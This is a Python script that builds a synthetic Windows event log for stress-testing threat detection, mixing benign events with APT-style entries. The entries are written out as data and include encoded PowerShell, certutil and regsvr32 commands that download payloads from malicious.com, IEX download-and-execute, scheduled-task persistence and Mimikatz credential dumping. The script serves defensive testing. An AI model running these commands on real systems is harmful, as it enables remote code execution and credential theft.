import json
import random
import os
from datetime import datetime, timedelta, timezone

def generate_stress_test(output_file="stress_test_log.json", total_logs=10000, apt_ratio=0.05):
    logs = []
    num_apt = int(total_logs * apt_ratio)
    num_benign = total_logs - num_apt

    base_time = datetime.now(timezone.utc) - timedelta(days=7)

    # --- Generate Benign Logs ---
    benign_templates = [
        {"EventID": 4624, "ComputerName": "WIN-SRV01", "SubjectUserName": "SYSTEM", "TargetUserName": "jdoe", "ProcessName": "svchost.exe"},
        {"EventID": 4688, "ComputerName": "WIN-WKSTN12", "SubjectUserName": "jsmith", "ProcessName": "explorer.exe", "CommandLine": "explorer.exe"},
        {"EventID": 5140, "ComputerName": "WIN-FS01", "SubjectUserName": "asmith", "TargetUserName": "admin", "ProcessName": "System"},
        {"EventID": 4634, "ComputerName": "WIN-WKSTN05", "SubjectUserName": "bsimpson", "TargetUserName": "bsimpson", "ProcessName": "svchost.exe"},
        {"EventID": 4689, "ComputerName": "WIN-SRV02", "SubjectUserName": "SYSTEM", "ProcessName": "taskhostw.exe"}
    ]

    for i in range(num_benign):
        template = random.choice(benign_templates)
        log = template.copy()
        log["TimeCreated"] = (base_time + timedelta(minutes=i*2)).isoformat()
        logs.append(log)

    # --- Generate APT Logs ---
    apt_templates = [
        # Encoded PowerShell
        {"EventID": 4688, "ComputerName": "WIN-WKSTN01", "SubjectUserName": "bway", "ProcessName": "powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAxAC8AcABhAHkAbABvAGEAZAAnACkA"},
        # Certutil download
        {"EventID": 4688, "ComputerName": "WIN-WKSTN02", "SubjectUserName": "rsmith", "ProcessName": "certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe"},
        # Mimikatz
        {"EventID": 4688, "ComputerName": "WIN-SRV01", "SubjectUserName": "SYSTEM", "ProcessName": "mimikatz.exe", "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"},
        # Scheduled Task Creation
        {"EventID": 4698, "ComputerName": "WIN-WKSTN03", "SubjectUserName": "jdoe", "ProcessName": "schtasks.exe", "CommandLine": "schtasks.exe /create /tn \"Updater\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc onlogon"},
        # Rundll32 malicious use
        {"EventID": 4688, "ComputerName": "WIN-WKSTN04", "SubjectUserName": "asmith", "ProcessName": "rundll32.exe", "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://malicious.com/payload.sct\").Exec();\""},
        # Regsvr32 Squiblydoo
        {"EventID": 4688, "ComputerName": "WIN-WKSTN05", "SubjectUserName": "bway", "ProcessName": "regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll"},
        # Powershell IEX
        {"EventID": 4104, "ComputerName": "WIN-WKSTN06", "SubjectUserName": "rsmith", "ProcessName": "powershell.exe", "CommandLine": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"}
    ]

    for i in range(num_apt):
        template = random.choice(apt_templates)
        log = template.copy()
        log["TimeCreated"] = (base_time + timedelta(minutes=i*20, seconds=random.randint(0, 59))).isoformat()
        logs.append(log)

    # --- Shuffle and Save ---
    random.shuffle(logs)

    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=2)

    print(f"Generated {total_logs} logs total.")
    print(f"  - {num_benign} Benign Logs")
    print(f"  - {num_apt} APT Logs (Signal)")
    print(f"Saved to {os.path.abspath(output_file)}")

if __name__ == "__main__":
    generate_stress_test()
